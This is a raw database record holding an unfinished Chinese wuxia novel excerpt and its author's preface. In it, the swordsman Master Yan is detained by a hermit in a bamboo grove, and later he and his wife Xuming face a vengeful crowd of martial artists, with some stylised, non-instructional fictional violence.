/>\n<p>苏子曰：可使食无肉，不可居无竹。</p>\n<p>隐机子乃是雅士，自然深信这“不可居无竹”之劝。竹，历来就颇受文人雅士好评，一代一代的风雅之士口相传颂，即使它本身并不美好，现在也应该美好了。何况竹本身确有其高雅的风姿，一片翠微，风鸣竹间，令人望之脱俗，闻之登仙。</p>\n<p>他们行至一片竹林，隐机子缓步下来，似乎怕打扰了这份静谧，他顾道：“寒舍便在此间，请。”</p>\n<p>至竹林深处，突然现出一片空地来，于空地上现出一座小竹屋来。一人端坐屋前，手持羽扇，小炉清烟，炉上壶鸣，一人一桌一炉茶水，瀹茗竹间。</p>\n<p>这人一身青翠，布弁，箭袖，绦巾，长裤，布履，无一不是竹青之色，若是隐匿竹间，几可避敌。他朝溆茗这边睃了一眼，笑道：“大哥真把他给请来了！但不知这位姑娘是谁？”</p>\n<p>隐机子笑道：“不相干。言公子尊老，自然是不肯拒绝我的——请。”说着便将他们让进屋里。</p>\n<p>言公子也笑了，“孤竹子竟也在这里！看来今天是走不了了。老先生，在下还是不进去的好，屋外宽敞，而况孤竹子也在屋外。”</p>\n<p>隐机子也就止步了。屋外还有几张小竹杌子，他勾下身来挪了挪，递与言公子与溆茗。</p>\n<p>言公子接过便坐了下来，道：“先生有何赐教，不妨早说。”</p>\n<p>孤竹子忽然接道：“大哥倒没什么赐教，只不过想请尊兄在这里长住些时候。”\n言公子笑道：“但不知先生可有这本事请得在下？”</p>\n<p>隐机子不禁动容，叹道：“公子还是先坐会儿，待到夕阳西下时你我再一决高下，何妨？与公子这样清雅之人交手，必然得在清雅时分，而一天之中，至清至雅之时便在这夕阳西下之时。古人诗云：‘仗剑红尘笑斜阳，疏雨江南岸两茫。’岂不快哉！”</p>\n<p>言公子笑道：“便依先生何妨！只可惜你我并不用剑。”</p>\n<hr />\n<p>晚照，碧空，翠竹。</p>\n<p>言公子站起身来，右手一摊，向隐机子道：“请。”</p>\n<p>隐机子伴着一阵咳嗽声站起，“只望公子在此屈居六年，我也不敢奢求过多，望这六年里可以洗去公子身上的唳气，不至再伤人无辜。”</p>\n<p>言公子叹道：“在下所杀之人皆是可杀之人，并无太大过错，先生何至于此！”</p>\n<p>隐机子道：“世上本无非杀不可之人，公子此举大干人和。闲言少叙，公子若能在一个时辰内捉住我的衣襟，我也不敢再强留公子了。公子可看到地上的九个圈了？我便落于这九个圈中。若是我落在了圈外，也算我输。公子意下如何？”</p>\n<p>这九个圈画在地上并不明显，圈很小，不过碗大一点，可是很圆很圆，似远观的太阳的圆形，散落于此间，只是零乱，不得要领。</p>\n<p>言公子道：“这倒不用了，先生只要不出这片空地便可。”</p>\n<p>隐机子笑道：“公子眼睛倒厉害，看出我这阵法的厉害了，我也就不便占公子的便宜，就依公子所言。——麻烦沈兄弟为我们弹奏一曲。”</p>\n<p>孤竹子应了声，自己便进屋取琴，而后长凳轻骑，抱琴于膝，调过弦后便开始弹奏起来。琴音瑟瑟，似一缕清风，抚过空寂的山间，抚过山涧的溪流，又跟随溪流而下，一路的怪石嶙峋，风吹浪，浪拍石，石鸣中天——不是石鸣，是鹤唳。便是这一声鹤唳，言公子出手了，借了这声音，真如鹤飞一般，向隐机子击去。</p>\n<p>微风入竹林。风声，琴声，啸声，天籁与人籁的共鸣，是一首诗，可是这诗里满怀了杀意，漫布竹间。溆茗盯着场中的两人，她自然是希望言公子可以胜过这糟老头子，但是现在不行，言公子必须得败。她一眨不眨地盯着两人，看言公子出手，看他的衣衫飞舞着，鼓动着的淡桃色映衬竹间，红与翠的默契相合，他不击则罢，这一击竟似必中的。</p>\n<p>但是没有。她看到隐机子佝偻的身子在风中摇了摇，丝绸般随风摇曳，完全不是自己在动，倒真似被风吹动着，他竟然仿佛是飘在空中的！溆茗不禁震在了那里。</p>\n<p>琴音澎湃，还是风声，但是已经是狂风了，风吹过松林，呼呼然作响，散落一地的松针，这松针又随了狂风纷飞，不知飞向何方。</p>\n<p>飞向何方，何方是家乡。</p>\n<p>风渐小，一点一点熄下来，是怡人的微风。琴音缓，缓缓入竹林。这琴音正与此情此景若合一契，混然天成，亦是微风吹拂着竹林的声响。不知是天籁知人籁，还是人籁赏天籁。</p>\n<p>琴已歇，可是言公子仍如鹤飞，却无论怎样也不能碰到隐机子。隐机子飘于风中，任由这微风的摆弄，他现在不是他自己，他乃是这竹林的生命，和风和竹一起，筑起竹林的生命，风助他，竹亦助他。言公子等于在同整个的竹林作战，他怎么战得过！纵使战得过，他也不能战——这只能闹得玉石俱焚。</p>\n<p>所以他停了下来，抱拳而立，道：“武林传闻，隐机子武功卓绝，看来此话不假；武林中又传闻，隐机子根本不会武功，看来此话亦不假。二十年来，先生一直是个神话，原来竟是如此，在下佩服。古人尝云列子御风而行，我尚不肯相信。今日看来，是我孤陋寡闻了。依先生这般，何止御风而行！古人曾不我欺呀！既是如此，先生要留在下，在下恭敬不如从命，就依先生所言。”</p>\n<p>隐机子仍如绸般舞于空中，道：“如此甚好。沈兄弟，我们这就去吧。”说着便随了这阵风飘向林外，不见踪影。言公子叹道：“这阵法确实厉害。”他知道，如果真有了那九个圈，他会更多的留意那些圈，猜测隐机子将落于何圈，可是自他那一击开始，隐机子竟不曾落地，所以隐机子根本不必理会自己落于何圈，而他则又要多分些心了。</p>\n<p>孤竹子束好琴，将琴收入屋中，整理了一番，出来同言公子道别，“竹屋下面有储藏室，每七日定有人送粮食过来，可储于此。窑里有酒，言兄若是不愿喝酒，窑里亦有往年收的雨水与雪水，言兄可以煮茶，那就告辞了。姑娘，我们这就走吧。”</p>\n<p>溆茗望言公子道：“我留下来陪你，你愿不愿意？”</p>\n<p>言公子没有说话。沉默那就是默认了咯，溆茗转头来笑道：“我不走，我留下来陪他。”</p>\n<p>孤竹子叹了口气，朝溆茗望了两眼，衣襟一摆，轻功展开，倏然而逝。</p>\n<p>溆茗拉了拉言公子的手，望他道：“进屋去吧。我做饭给你吃。”可是她过去是小姐，即使流落街头也没有轮上她自己做饭给自己吃，她又拉了拉言公子的手，害羞道：“这可是我第一次做饭。”她想，她又要多一个第一次的经历了。</p>\n<p>言公子皱了皱眉头，叹了叹气，也就进屋去了。他可不愿意做别人的实验品，所以他自己做饭，他为她做饭。</p>\n<hr />\n<p>鸣翠依旧喜欢月亮，尤其喜欢圆月。可是多半的时候并没有圆月，月是如钩的，勾起了多少回忆，多少相思泪呵！喜欢圆月，大概也是因为圆月之不可多得吧。现在月如钩，鸣翠依旧倚朱楼，凭栏而望那一弯银月。夜是墨浸的一块白布，零零落落地几点星是幕布的底色中未被墨染的点点滴滴。</p>\n<p>也还是在这样的夜晚，算起来似乎已经六年了，她小姐就是在这样的夜里离去的。这六年里，多少的悲欢离合演绎着，多少的欢声笑语酩酊着，可是府里依旧是府里的生活，一成不变，任岁月一点一点侵蚀。</p>\n<p>在这一成不变里唯一变化着的只有鸣微，她做了楚王那傻儿子的妃子了，一下从奴仆变作了奴仆的主人，她们也就此失去了联系。鸣翠低下头来，似乎竟嫉妒起鸣微来，她不要就这样一辈子白搭在府里，成日里被呼来唤去的，然后嫁给一个男仆，然后再待在府里做老妈子，这不是她想要的，人生需要些许不同的经历。\n她忽而莫名的兴奋起来，“既然小姐可以逃走，为什么我不可以呢！”</p>\n<p>这大胆的想法萦绕心间，诱惑着她，她愈想愈是后悔，当初就应该跟着小姐一起出逃的，但是就算是现在，那也不算太迟，毕竟她还没有嫁人。鸣翠望着那钩月，终于下定了决心。</p>\n<p>出走并不难，难的是出走以后的谋生。她不像她小姐，可以带出一大堆盘缠，她知道分寸，她只带上属于自己的衣物，也许是为以后留下后路，免得落下盗窃的口垢，纵然穷途后想回来也是不可能了。</p>\n<p>夜深，人亦静。</p>\n<p>荆州不如扬州般柔情，扬州的夜是温柔乡胭脂坊，荆州的夜永远都如战士般冷清冷静，是战场上的肃穆——只是没有战士。鸣翠一个人走在大街上，只有自己的脚步声同天幕的弯月伴随着她；她听着这声音，望着那弯月，这才暂时忘却了孤独，忘却了这骇人的寂静的夜。</p>\n<p>太平盛世里的城，永远都是脆弱的，禁不起敌人的攻击。城门大开，没有守城的兵，鸣翠就这样轻轻松松地出了城，一路向南走去。她这时一身青布衣，灰土裤子，小帽，布履，近于男子的装束，肩负着青花纹的布包袱，步履轻快。</p>\n<p>郊外自然本该更见清静，但是偶而还有虫鸣有草动，鸣翠在月光里走了一程，前面竟然热闹了起来，依稀见到了几点灯火。</p>\n<p>是一片空林地，近百人围着一个圈，也不知在做什么游戏。鸣翠踌躇了些时候，觉得去打扰他们总是不太好，并且看那些人的架势，倒并不好惹；然而她还是按捺不住内心的好奇心，她竟一点一点向那里逼近，偷偷猫在一棵大树旁。</p>\n<p>鸣翠的眼睛真好，她竟依稀觉得圈子里被围着的是她小姐李溆茗。</p>\n<hr />\n<p>被围着的并不只溆茗，还有言公子，还有她同言公子的小公子。</p>\n<p>言公子仍旧是一袭淡桃色无绣丝制长袍，拦腰一围浅黄色丝巾玉绦，下面是灰白描翠的裤子，脚蹬土色布履，也依旧不曾束冠，形容俊雅。溆茗一身白，白帽白衣白裙白履，是隐机子留下的衣物，她手里牵着小孩子，依傍在言公子身旁。</p>\n<p>小孩子突然道：“妈妈，我饿了，我要吃饭饭。”</p>\n<p>溆茗低头看了看他，抬手抚摸起他的头，轻声道：“丹青，乖。等爸爸办完了事，妈妈给你买糖糖吃。”</p>\n<p>小孩子听见有糖吃，果然不再闹了，很乖顺地挨着他母亲，静待这莫名的游戏的结束。他是这次出门后才吃过糖的，第一次吃糖便喜欢上了糖果。现在那些大叔叔大婶婶们围着一个圈是做什么呢？他啃起指甲，仔细琢磨起来，然而想破了小脑袋也想不明白。</p>\n<p>言公子开口道：“各位错了，大错特错。既然挑在了晚上，那就不该在今天晚上。既然挑在了今天晚上，就不应该到这时还不出手。既然到这时还不出手，那我们妻儿可就要走了。”</p>\n<p>“姓言的，你以为今天走得了么！六年前我师兄惨死于你手下，今日我便要为他报仇，以慰我师兄的在天之灵。”说话的是一个矮小精悍的白面小生，手执一把山河图的纸扇，一脸激愤而又偏偏装得从容镇定。</p>\n<p>一石激起千层浪，他这一句话可谓是抛砖引玉，大伙儿马上就沸腾了，纷纷怒喝起来，有人道，“还我师傅命来”，还有人道，“还家父命来”，还有人道，“我要为我丈夫报仇”，但是更多的人只是辱骂，从言公子的祖宗十八代骂到孙子十八代，仿佛这样可以杀掉言公子似的，偏偏就没人敢上前动手，因为谁也不想第一个送命。</p>\n<p>言公子叹道：“哎，冤冤相报何时了。各位又何必如此执著？我本意是想放各位一条生路，为什么各位就不肯给我这个机会呢？”</p>\n<p>众人不免一笑。一位老先生站出来道：“姓言的，你休出狂言。我等百人，难道竟奈何不了你么！你还是束手就擒的好。我担保绝不为难你妻儿。”</p>\n<p>“怎么能放过他们！斩草要除根。”</p>\n<p>“血债需血偿，杀他妻儿也不为过。”……</p>\n<p>老先生面色如铁，厉喝道：“老夫说过不许为难他妻儿，众位没长耳朵么！”</p>\n<p>“阎老鬼，你以为你是谁呀。你这个阎可不是他那个言，没必要去维护他吧。所谓民意不可违，老鬼你还是省省吧。”</p>\n<p>“阎罗清，你哪根葱？你说话就是圣旨了？就是圣旨，老子也把它当个屁！给老子滚一边去。”说话的是一个油光满面的胖子。</p>\n<p>阎罗清一阵狂啸，大喝一声：“找死！”右手如爪，直扑过去。那人毫无防备，不禁一谔，便在此时，喉头已入了阎罗清之手，只需阎罗清稍一用力，他这喉头怕是不保；眼见危在旦息，他不由得全身酸软，说不出话来，看来这人只是口上功夫厉害的草包。</p>\n<p>阎罗清笑道：“无知狂徒，老夫说不许为难他妻儿便是不许为难他妻儿。”他那一身黑衣劲装伴了这夜色再加了他诡异的身手再与他鹰一般的眼睛相合，众人只觉心里一寒。阎罗清心下不免得意，他自从死了弟弟后便狠下心来刻苦习武，六年来闭门不出，武功精进也是意料中的事，这次一试，果真不可与过去同日而语。</p>\n<p>人一高兴就忘乎所以，这是不变的真理。阎罗清正自得意，他的手便已被人从那喉头卸下，又给人紧握在了手里，他扭头一看，是一个和尚。武林中人一见了会武功的和尚便以为是少林寺的和尚，这想法在绝大部分时候是对的，言公子却知道这和尚不是，他根本就没到北方去过，也不至于得罪少林寺的人。</p>\n<p>但是言公子猜错了，这和尚偏偏就是少林寺的。只听阎罗清道：“原来是少林寺的空明和尚，失敬，失敬。”便这两声“失敬”，他手一缩，已经从空明手里脱了出来。</p>\n<p>空明和尚笑道：“阎施主慈悲，和尚钦佩。然劲敌尚还未除，我等便已生内讧，不免使敌人有可趁之机。阎施主所言甚是，和尚担保没人敢去伤他妻儿。”</p>\n<p>言公子重重的叹了口气，道：“各位为了在下而伤和气，在下实在觉得愧疚，即是如此，在下这条命赠与各位又有何妨。且容我与妻子说几句话。”他说着便俯到溆茗耳边嘀咕了几声。溆茗不禁脸上起了红晕，咬了咬唇，低下头轻声问道：“真要这样么，星哥？”</p>\n<p>言公子点了点头，然后便解了玉绦，散开这一身的淡桃红的长袍，露出如女子的白净的胸脯，他竟只穿了这一件长袍。溆茗犹豫了些时候，两眼注视着言公子，可是，他并没有改变想法的意思，她也只好解了衣襟。</p>\n<p>众人眼见了这等奇事，不禁大骇，以为言公子要施展什么法术了；又眼见了溆茗一件一件卸去了衣衫，不禁色心大起，直愣愣地瞧着她，也懒得再理会言公子的法术了。</p>\n<p>等溆茗脱去了里背心，言公子便给她披上了自己的那件长袍。淡桃红的衣裳，衬着淡桃红的面颊，溆茗脸上一阵滚烫。言公子紧握住溆茗的手，在她滚烫的面颊上吻了一下，又俯到她耳边嘱咐了几句。</p>\n<p>溆茗点了点头，眼角沁出泪来，已经哽咽了，她哑声道：“你真的不顾我们了么？”</p>\n<p>言公子依旧握着溆茗的手，面容越发白净了。</p>\n<p>他抬头向众位武林人士道：“各位可知在下为何要取各位亲友性命？只因在下喜欢他们的血。世人多有收集的嗜好，在下亦然；有的人喜欢收集石头，有的人喜欢收集树叶，有的人喜欢收集宝剑，有的人喜欢收集金银，还有的人喜欢收集女子，在下不才，在下的嗜好便是收集人血，只可惜到目前为此才收集到一百三十六人之血。懂得收集的人必然知道，收集倘若不收集珍奇的事物，还不若不收集！在下若要收集，自然会收集那些比较有名望一点的武林君子的血，也就是各位的亲友的血。在下所求也并不过份，只不过一滴血而已，但是向他们求这一滴血实在比登天还难！世人只知道流血是一件很痛苦的事，他们不愿意承受这痛苦，在下求之不得，也曾心下悔恨，自己亦觉得过于自私了，怎么可以将自己的快乐建立在别人的痛苦之上呢！然而偏偏又有了这么个嗜好，也没有办法。于是在下便想到了一个一举两得的方法，既可以满足在下的嗜好，又可以免除他人的痛苦。现在想来，在下还是错了。在下只考虑到流血之人的痛苦，而没有考虑到流血之人的亲友的痛苦，大错特错。为了弥补在下的过错，在下本来亦准备解决各位的痛苦。但是现下又改变主意了，只怕解决了各位的痛苦，各位的亲友便又痛苦起来。罢了罢了，索性还在下大方一点吧……”</p>\n<p>言公子说着，忽而飞跃而起，到得一黑衣女子身前，剪手夺过她手里的匕首，便又退至中间，匕首便已插在了他白净的胸膛上。血沿着匕首一点一点滴下来，在这如烟的空气中凝聚，又一滴一滴溅在草地上。</p>\n<p>众人面面相觑，左右顾盼，实难理解这一幕。他们看着言公子流血，看着他的血落在地上，又看着他倒在了地上，可是言公子却依旧嘴角含笑着。</p>\n<p>空明和尚双手合十，拜了一拜，默念数语向各位道：“既然此人已死，我们走吧。”</p>\n<p>胖子问道：“那这两个人呢？”</p>\n<p>阎罗清不禁动怒道：“空明和尚说过放这二人一条生路，各位没有听见么！”</p>\n<p>溆茗哼了哼，笑道：“各位就真这样走了？”</p>\n<p>阎罗清安慰道：“姑娘，在下担保没人敢伤姑娘。姑娘这就回去吧。”</p>\n<p>溆茗冷眼瞪着他，哼道：“刚才……刚才你都看见了？”</p>\n<p>众人纷纷笑起来，遇了这样的事，大家不去瞧仔细了，难道还会闭着眼睛不成？阎罗清想了想，若说看见了，别人姑娘脸上不好看，若说没看见吧，那又是自欺欺人，思量一二，他也只好点了点头。</p>\n<p>溆茗叹道：“既是如此，各位就想这样走了么！还是留下各位的眼睛再走吧！”</p>\n<p>众人又是一笑，这姑娘说话简直是不知天高地厚！在这笑声中，溆茗长袖飞舞，跳动着脚步，踏着这笑声的旋律起落盘旋。众人冷眼瞧着，然而只是一瞬，就再也瞧不见了，血水与黑水从众人眼中激射出来，溅到溆茗的衣袖上，在衣袖上渗透，然后混为一体，淡桃色的长袍越染越深，变作桃色长袍，而后又变作梅色长袍。</p>\n<p>在这一片嚎叫声里，十多盏灯笼飞散出去，在空中划出几记华美的淡黄的弧迹，落在了地上。溆茗牵起小孩子，一个飞跃，落在鸣翠身边，一把掐住她肩胛。鸣翠“啊”地尖叫了一声，道：“小姐，是我！”</p>\n<p>溆茗这才认清，便放开了手。鸣翠蹲下来摸了摸小孩子的头，问道：“这位是小少爷？”</p>\n<p>溆茗点了点头，“走吧。鸣翠，你也跟我们一起去吧。”</p>\n<p>鸣翠犹豫着，可是还是点头同意了，她望那边看去，道：“那姑爷的尸体呢？”</p>\n<p>溆茗神色黯然，摇了摇头，“算了，不管他了。这就走吧，我实在懒得见到这些人。”</p>', '2014-11-06 23:42:49', 5, '2013-12-03 13:11:00', '2013-12-03 13:11:00', 0, '[["\\u516c\\u5b50", 0.17950590406669006], ["\\u673a\\u5b50", 0.08300899917861473], ["\\u9e23\\u7fe0", 0.07249938798439196], ["\\u5404\\u4f4d", 0.04147180692292691], ["\\u5c0f\\u59d0", 0.03627315538589211], ["\\u960e\\u7f57", 0.035519108904915414], ["\\u6536\\u96c6", 0.032474634236131505], ["\\u53ef\\u662f", 0.030763358799170124], ["\\u6843\\u8272", 0.027462074106766682], ["\\u548c\\u5c1a", 0.024040220610462813], ["\\u65e0\\u8d56", 0.023469256177874244], ["\\u957f\\u888d", 0.02318645665207788], ["\\u7af9\\u6797", 0.02280463288196617], ["\\u7136\\u800c", 0.02244316294], ["\\u7b2c\\u4e00\\u6b21", 0.021870587824079156], ["\\u59bb\\u513f", 0.021663547790635174], ["\\u8fd8\\u662f", 0.021619908497516757], ["\\u81ea\\u5df1", 0.021365380733246092], ["\\u5148\\u751f", 0.021311385500185125], ["\\u4ed6\\u4eec", 0.021288118063654642]]', NULL, NULL, '這是一篇武俠小說，是 2008 年寫作的，可是未完成。前些時候，翻閱以前練手的作品，無意間發現的，可是竟想不起來要寫一個甚麼樣的故事了。\n這一系列，前後快五萬字了，但是我對後面的故事並不滿意。即使滿意了，也不知道接下來要寫些甚麼，所以不如推倒重來，重新構思一個故事。遺憾的是，我並不擅長寫故事，我喜歡寫景，寫環境，寫氛圍，寫心理，唯獨故事是個軟肋。如果將這些裝飾去掉，這個故事恐怕又無趣極了。\n但是楔子部分我還是挺喜歡的，雖然很多情節的發展無法理解，有些情景又過於飄逸，人物塑造沒有特點。可是畢竟是自己寫的，總忍不住要包庇一下。如果有可能的話，希望能夠寫完。\n之前申請了一個郵件列表 tinyletter.com/lepture，我將在這個郵件列表裡更新新的章節。如果有興趣的話，請訂閱之。訂閱者多於 200 人後，我將開始構思這個故事。所以想要繼續看下去的同學，廣泛傳播之。\n下面先預覽一下我將保留的楔子部分吧。\n楔子\n桂花蒸的夜，到处弥漫着一股热烘烘的清新。刚过了中秋，月还是银盘似的满月，然而月光不像平时般清冷，是暖玉里散发出的光泽，温润莹澈。\n月光照朱楼，照在二楼的丫鬟鸣翠身上。她着一袭翠竹底色的描白敞袖褂子，下面是藕合色齐踝长裙，发钗已经退去了，头发顺背直披下来。这时候她正凭栏远望那一轮圆月，凭空里轻声叹了口气。她卷起袖子，两只胳膊搭在栏干上，月光直泻过来，越发显得她膀子白净了，然而偏偏于这白净的手臂上刻下了几道血痕，是鞭子抽打过的。鸣翠低头瞟了瞟，咬了咬嘴，便又向着月亮瞧去。\n她屋里还有两个丫鬟同住，下人们的住所自然是略嫌挤些，倒没什么可抱怨的。她听到身后有动静，便回过头来看了看，是鸣微。\n鸣翠便放下了袖子，问她道：“你怎么醒了？”\n鸣微掀起毯子下床过来，伸了伸胳膊，舒展一下筋骨，道：“这天怪热的，竟被热醒了！你怎么还没睡？”\n鸣翠便又转过头去看月亮，轻声道：“虽然热，你倒是披一件衣裳，比不得夏天，到底是入了秋，仔细着凉。你也过来看月亮吧。”\n鸣微笑道：“哪里就着凉了！”说着便过去了。她只穿了一件月白色里背心，光着脚，头发是枕过后的凌乱的发式，她便张手理了理，拉顺了披到背后。鸣微道：“你倒是好心，你们大姑娘竟不曾替你想过？手伸过来给我看看，我这里还有些药膏，是上月张大夫来时我私底下向他要的，拿来给你涂涂。”\n鸣翠苦笑道：“我们小姐也真是命苦了，自小便死了亲娘，而今大了些，老爷竟要将她嫁给一个傻子，换了是我，我也是不肯嫁的。”\n鸣微叫道：“哎呀呀，大小姐。你左右不过一个丫鬟，将来最多不过放出去配个小厮罢了。你倒想想，楚王的傻儿子总要强过那些灰孙子的灰儿子吧。”\n“你们嚷什么呢？还不睡么！”是屋子里另一个丫鬟的声音。\n鸣翠轻声道：“小声点吧，别把她给吵起来了。——我们是丫鬟，小姐可不是。阖府上下，哪个不觉得把小姐嫁给个傻子委屈了小姐！就我们这样的人家，要招俊俏哥儿作上门女婿，那少说也得来个千把人。真搞不懂老爷是怎么想的，居然要将小姐嫁给个傻子！”\n鸣微道：“你倒是少说点吧，仔细给人告去了老爷，又是一顿好打！其实老爷也不容易了，自从夫人去了，这么些年来也没——阿嚏！”\n鸣翠道：“快进去焐一焐。我说的吧，叫你仔细着了凉，你又不听。哎呀，经你一闹，搅得人越发睡不着了，你快进去睡去，让我一个人静静，过会儿也好去睡觉。”\n月影映在蟹色的暮空里，仿佛一张药膏子，贴在划破了的天空，一息突兀的沉痛。鸣翠终究没有睡下，直愣愣地瞧着远方，“不知道小姐现在怎么样了？！”\n\n她小姐叫李溆茗，刚过了十五岁，正是谈婚论嫁的年纪。她是从下人那里听说的，她父亲给她说了个傻子夫婿。她自然不肯，同父亲闹也没有结果，没奈何，只好求着丫鬟鸣翠帮忙打点一下，疏通疏通家里的奴仆，自己备了细软逃出府去。\n买舟南下，至公安歇脚。\n她这还是第一次出门，格外兴奋，对一切事物倍感新鲜。然而快乐总是不长久，包袱很快便弄丢了，也不知是被偷去了还是自己给忘在哪里了，但是结果总是一样，自己已经陷入了穷困。幸好还有些许随身的饰物可以拿去当掉，也足够回家了。\n可是真的就这样回家么？她不甘心，怎么会甘心！才出走两日便回府，叫人知道了还不笑掉大牙！她咬了咬牙，狠下心来，怎么也得过上一个月再回家，现在就留在公安吧，得熬且熬。\n\n八月廿四，这并不是一个特殊的日子，平凡的早晨，平凡的街市，平凡的人们以及他们平凡的吵嚷声。太阳还未升起，天已经放白，菜市场里一阵喧闹，卖菜的小贩与买菜的妇人叨唠着价钱，为一文钱而争得面红耳赤。\n溆茗嗤鼻而笑，她当然不能嘲笑他们的小器，她也不愿意去嘲笑这些人，有什么可笑的呢！她只是自嘲——她竟连一文钱都没有了！这实在太可笑，她连值得一当之物都没有了，只有这一身的丝绸箭袖还值些钱，但是现在恐怕也不值钱了，纵使很值钱，她也不能去当掉。她这时散步于菜市场中，蓬松的头发凌乱着，沾满了灰尘泥垢，土灰色的脸上纵横几笔无奈，土灰色的衣衫上镂空几缕破洞，是纯粹的土的灰色，一种不起眼的色彩。\n菜市场并不只卖菜，有时还有卖粥卖馒头的。像屠夫的刀，也并不只是宰猪宰牛的，有时候它还可以宰人。卖粥的开始吆喝起来：“粥，热乎乎的粥，一文钱一碗咯！”卖馒头的也接着吆喝道：“馒头咯，两文钱三个咯！”\n溆茗朝他们瞪了一眼，心里恨恨道：“嚷什么嚷！真烦人，把人家肚子都给叫饿了。”可是她没有钱，她第一次深陷于这潦倒的尴尬境地，只有无可奈何地叹气，甚至自己都开始怀疑起当初的决定了，心下悔恨：也许嫁给楚王的那傻儿子至少比现在强些吧。\n这次的离家出走，她经历了许多的第一次，第一次出了荆州城，第一次乘船，第一次住客栈，第一次进当铺……第一次流落街头，现在又是第一次乞讨，而且还是向卖馒头的小贩乞讨，倘若被拒绝，那可真是无地自容了。幸而这小贩心还好，给了她两个馒头，溆茗心里默默祝道：“将来必定加倍奉还。”可是她没出声，说了别人也只有把她当疯子，徒惹嘲笑。\n菜市场里忽然起了异样的声音，也是吵嚷，然而不似先前的那般平和的吵嚷，夹杂了几许恐慌。是几个无赖前来捣乱，一阵推扰着向溆茗这边过来，他们倒并非冲着她来的，不过正好溆茗在市场的一头，他们是从另一边砸过来的，稀稀啦啦乒乒乓乓，先来个下马威，震住了小贩们，才方便收保护费嘛。\n溆茗又多了一个第一次的经历，第一次被无赖围了起来，看他们张牙舞爪地一点一点逼近。她不住地向后退去，不过三四步便抵着一块案板了。\n“是个娘们，洗一洗兴许还挺标致的，咱们抓回去卖给叶大娘倒也不错。”是一个无赖的声音。很动听的声音，天生的歌喉里的声音，可是偏偏用来说了这样的句子，是对才能的浪费也是对才能的侮辱！\n突然，一切都静了下来。\n太阳已经露出了轮廓，在景泰蓝的天空绘出酡红的一轮圆，又将这酡红溢射出去，醉染了附近的云朵，也醉染了溆茗的面颊。无端的，于这醉人的柔和的日光里现出一张俊秀的脸庞来，线条明晰的轮廓，方脸，浓眉，鹰鼻，细唇，只是眼神里却一片散漫与颓丧，不似他身体一般的精神抖擞。他穿一件淡桃色无绣丝制长袍，拦腰一围浅黄色丝巾玉绦，下面是灰白描翠的裤子，土色布靴，没有束冠，长发披肩而下，略嫌零乱。\n六个无赖定格在了那里，还是原先的姿势，唯一的不同便是多了喉头上的一滴血。他过到一个无赖身前，右手食指抹去了那一滴血，又顺手擦在了自己衣服上。他就这样依次地将六滴血都抹到了衣服上，然而衣服上没有留下血迹，血像活了一般，融入到这淡桃色里，使这份淡桃色浓了些许艳丽。\n无赖们还是不动，画面永久地定格在了那里，不仔细看，连伤口都没有，简直就是活生生的动弹不得的人。他俯身到溆茗这边，伸手过来；溆茗瞧了瞧，觉得满心的愉快，也就搭手过去了。两个人离开菜市场，隐没在了人群里，菜市场也就回复了往日的平和的吵嚷，像是做了一个梦，然而现在又醒了。\n\n街道上开始热闹起来，大多数的店铺也已经开门做起了生意。\n溆茗被带去洗过澡换过衣衫，她又回复了往昔的小姐模样，虽然衣着并不十分华贵。一袭玉黄的长布衫子，土褐色粗布裤子，黑色布靴，可是她面色红润，在这不施粉黛的眉目间透露出几许清丽脱俗，发式挽了个叠嶂的云髻，于发束插了支里黄的玉簪。溆茗觉得还满意，他应该会喜欢的。\n他们走在街道上，手牵着手，招惹来路人的侧目而视。可是他们不理会，依旧我行我素旁若无人地走着。\n溆茗仰头问道：“我们这是要去哪里？”\n公子依旧迈步向前，答道：“荆州。”\n溆茗不禁一震，仍是仰面望他道：“去荆州干什么？”\n公子的回答依旧简单——“杀人。”\n溆茗嘴角微微翘起，露出一息狡黠的笑，她问道：“杀谁？”\n公子道：“楚君子。”\n溆茗问道：“谁？”\n公子道：“李君如。”\n溆茗一颤，“啊”了一声，呃然问道：“为什么？为什么要杀他？”\n公子停下脚步，回过头来，一脸严肃，道：“我讨厌君子。君子比无赖更叫人讨厌。我恨他们。我要杀尽天下的无赖与君子。”\n溆茗紧紧握住他的手，咬牙道：“如果我求你别去杀他，你愿不愿意？”\n公子摇了摇头。\n“如果换作我求你别去杀他，你可愿意？”这声音来自遥远，然而仿佛又是近在咫尺，每一字都清清楚楚地落在了公子的耳朵里。\n公子拦腰抱起溆茗，箭步如飞奔向那个声音。\n街市一阵骚动。\n\n这时候出城的多是农人，才刚刚卖过了蔬菜，现在又要匆匆赶着回家，为了生计奔波。他们一刻也不停地迈着自己的步子，肩上负了扁担，扁担两头挂着的竹框也已空去，现在看上去一身轻松，这倒不是因为没有负重的关系，能够这样早就将菜给卖净，腾出时间来干点别的事，无论如何也是值得高兴的。\n唯有一位槁项黄馘的老者侍立于道上，一动不动。他佝偻着身子，一头散披的白发，身穿梨花白的绣竹宽袖长裙羽衣，束玉白色龙纹宫绦，裤子给裙摆遮住了，不见风彩，脚上蹬着一双白履，只是白，白得耀眼，白得一尘不染，仿佛不是尘世里的人。\n老者咳嗽了两声，自言道：“言公子来了？”\n于是他又开始咳嗽起来，这一声咳嗽过了，他眼前便现出两个人来，他望着他们，细细打量了一番，又自言道：“言公子来了？”。\n溆茗扭头睃了公子一眼，心下道：“唔，原来他姓言。”\n言公子笑道：“先生怎知在下姓言？”\n老者又咳嗽起来，顿了顿道：“能使出如此的武功，必然内力极为精湛，而放眼天下，能有如此内力的，除了言家的人外，也就止二三人罢了。然而不巧，这二三人皆是我相识的。”\n言公子叹道：“先生都看见了？”\n老者道：“我虽然看见了，但是要阻你一阻也是万万不能的。”\n言公子笑道：“先生想必就是隐机子吧？孤竹子和松涛子在下已经见过了。”\n老者又咳嗽起来，咳过后接道：“那么，我若是请公子到寒舍一叙，不知公子可愿意？哎——没有想到杨兄弟也败给了你。”他说着便迈步引路起来。\n言公子便牵过溆茗的手，跟着老者向远郊走去。\n言公子笑道：“松涛子倒并非败于在下手中，他一路追踪在下，在下避之唯恐不及，哪里敢同他交手！然而半路上，他不知得了什么消息，现下已经赶去长安了。”\n “唔，这就难怪了，” 